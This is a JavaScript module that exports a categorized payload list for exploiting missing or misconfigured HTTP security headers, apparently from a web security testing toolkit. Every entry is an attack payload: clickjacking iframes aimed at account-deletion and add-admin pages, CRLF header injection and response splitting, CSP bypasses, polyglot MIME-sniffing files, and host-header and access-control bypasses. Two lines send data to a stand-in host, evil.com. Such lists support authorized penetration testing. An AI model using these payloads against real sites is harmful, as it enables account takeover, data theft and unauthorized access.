/**
 * Header Injection / Security Header Exploitation Payload Module
 *
 * Categories: basic, advanced, filter_bypass, context_header
 */

const payloads = [
    // ── BASIC — Clickjacking PoCs ──────────────────────────────────────────────
    {
        type: "basic",
        payload: "<iframe src=\"https://target.com/account/settings\" width=\"500\" height=\"500\" style=\"opacity:0.1;position:absolute;top:0;left:0\"></iframe>\n<button style=\"position:absolute;top:200px;left:200px;z-index:-1\">Click to win!</button>",
        description: "Clickjacking PoC — transparent iframe overlay",
        expected_behavior: "Victim clicks 'Win' button but actually clicks iframe button behind it"
    },
    {
        type: "basic",
        payload: "<iframe src=\"https://target.com/account/delete\" style=\"width:100%;height:100%;border:none;opacity:0\"></iframe>",
        description: "Full-page clickjacking iframe — account deletion",
        expected_behavior: "Invisible iframe overlays entire page; any click triggers deletion"
    },
    {
        type: "basic",
        payload: "<style>iframe{position:absolute;top:-9999px;}</style>\n<iframe src=\"https://target.com/admin/add-admin?user=attacker\" width=\"1\" height=\"1\"></iframe>",
        description: "Hidden iframe — administrative action trigger",
        expected_behavior: "Invisible iframe silently loads admin action URL"
    },

    // ── BASIC — CRLF / Header Injection ────────────────────────────────────────
    {
        type: "basic",
        payload: "%0d%0aSet-Cookie:malicious=true",
        description: "CRLF injection — inject Set-Cookie header",
        expected_behavior: "Injects additional Set-Cookie header via CRLF in response"
    },
    {
        type: "basic",
        payload: "%0d%0aLocation:https://evil.com",
        description: "CRLF injection — inject redirect Location header",
        expected_behavior: "Injects Location header causing redirect to evil.com"
    },
    {
        type: "basic",
        payload: "%0d%0a%0d%0a<script>alert(1)</script>",
        description: "CRLF injection — HTTP response splitting with XSS",
        expected_behavior: "Double CRLF ends headers, injects HTML body with script"
    },

    // ── ADVANCED — CSP Bypass ──────────────────────────────────────────────────
    {
        type: "advanced",
        payload: "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js\"></script>\n<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>",
        description: "CSP bypass via AngularJS from whitelisted CDN",
        expected_behavior: "If cdnjs.cloudflare.com is in CSP, Angular sandbox escape executes alert"
    },
    {
        type: "advanced",
        payload: "<script src=\"/api/jsonp?callback=alert(1)//\"></script>",
        description: "CSP bypass via JSONP endpoint on same origin",
        expected_behavior: "JSONP callback wraps payload; executes within same-origin CSP"
    },
    {
        type: "advanced",
        payload: "<base href=\"https://evil.com/\">",
        description: "Base tag injection for script-src relative path hijack",
        expected_behavior: "Relative script srcs now load from evil.com instead of target"
    },
    {
        type: "advanced",
        payload: "<meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'unsafe-inline'\">",
        description: "Meta tag CSP override attempt",
        expected_behavior: "In some browsers, meta CSP may override response header CSP"
    },

    // ── ADVANCED — HSTS/SSL Strip ──────────────────────────────────────────────
    {
        type: "advanced",
        payload: "sslstrip",
        description: "SSL stripping attack command (MITM tool)",
        expected_behavior: "Downgrades HTTPS to HTTP on the wire; intercepts credentials in plaintext"
    },
    {
        type: "advanced",
        payload: "<meta http-equiv=\"refresh\" content=\"0;url=http://target.com/login\">",
        description: "Force HTTP downgrade via meta refresh",
        expected_behavior: "Redirects browser to HTTP version of login page if HSTS not set"
    },

    // ── ADVANCED — MIME Sniffing ───────────────────────────────────────────────
    {
        type: "advanced",
        payload: "GIF89a<script>alert(1)</script>",
        description: "Polyglot GIF/HTML file for MIME sniffing attack",
        expected_behavior: "File passes GIF validation but browser renders as HTML if X-Content-Type-Options: nosniff missing"
    },
    {
        type: "advanced",
        payload: "%PDF-1.4\n<script>alert(1)</script>",
        description: "Polyglot PDF/HTML file for MIME sniffing",
        expected_behavior: "File passes PDF check but browser may render as HTML"
    },

    // ── FILTER BYPASS ──────────────────────────────────────────────────────────
    {
        type: "filter_bypass",
        payload: "%0d%0aX-Frame-Options:%20ALLOWALL",
        description: "CRLF injection to override X-Frame-Options",
        expected_behavior: "Injects permissive X-Frame-Options enabling clickjacking"
    },
    {
        type: "filter_bypass",
        payload: "%E5%98%8A%E5%98%8DSet-Cookie:malicious=true",
        description: "Unicode CRLF bypass (UTF-8 %E5%98%8A = CR, %E5%98%8D = LF)",
        expected_behavior: "Unicode CR/LF characters bypass ASCII CRLF filters"
    },
    {
        type: "filter_bypass",
        payload: "<link rel=\"prefetch\" href=\"https://evil.com/steal?data=x\">",
        description: "CSP bypass via link prefetch (exfiltration without script)",
        expected_behavior: "Prefetch sends request to attacker even if script-src is restricted"
    },
    {
        type: "filter_bypass",
        payload: "<style>@import 'https://evil.com/steal.css';</style>",
        description: "CSS import for data exfiltration (if style-src allows)",
        expected_behavior: "CSS @import loads external stylesheet that can exfiltrate form data"
    },

    // ── CONTEXT: HEADER ────────────────────────────────────────────────────────
    {
        type: "context_header",
        payload: "X-Forwarded-Host: evil.com",
        description: "Host header injection via X-Forwarded-Host",
        expected_behavior: "If app uses XFH for URL generation, links/redirects point to evil.com"
    },
    {
        type: "context_header",
        payload: "Host: evil.com",
        description: "Direct Host header override",
        expected_behavior: "Password reset links or cached pages may reference evil.com"
    },
    {
        type: "context_header",
        payload: "X-Forwarded-For: 127.0.0.1",
        description: "IP spoofing via X-Forwarded-For to bypass IP whitelist",
        expected_behavior: "May bypass admin panel IP restrictions if app trusts XFF"
    },
    {
        type: "context_header",
        payload: "X-Original-URL: /admin/dashboard",
        description: "URL override via X-Original-URL to bypass access controls",
        expected_behavior: "Some reverse proxies honor X-Original-URL, bypassing path-based ACLs"
    },
    {
        type: "context_header",
        payload: "X-Rewrite-URL: /admin",
        description: "Path bypass via X-Rewrite-URL header",
        expected_behavior: "Similar to X-Original-URL; rewrites request path internally"
    },
];

module.exports = {
    vulnerability: "header_injection",
    name: "Header Injection / Security Header Exploitation",
    description: "Payloads for exploiting missing or misconfigured security headers including clickjacking, CRLF injection, CSP bypass, MIME sniffing, and host header attacks",
    payloads,
};
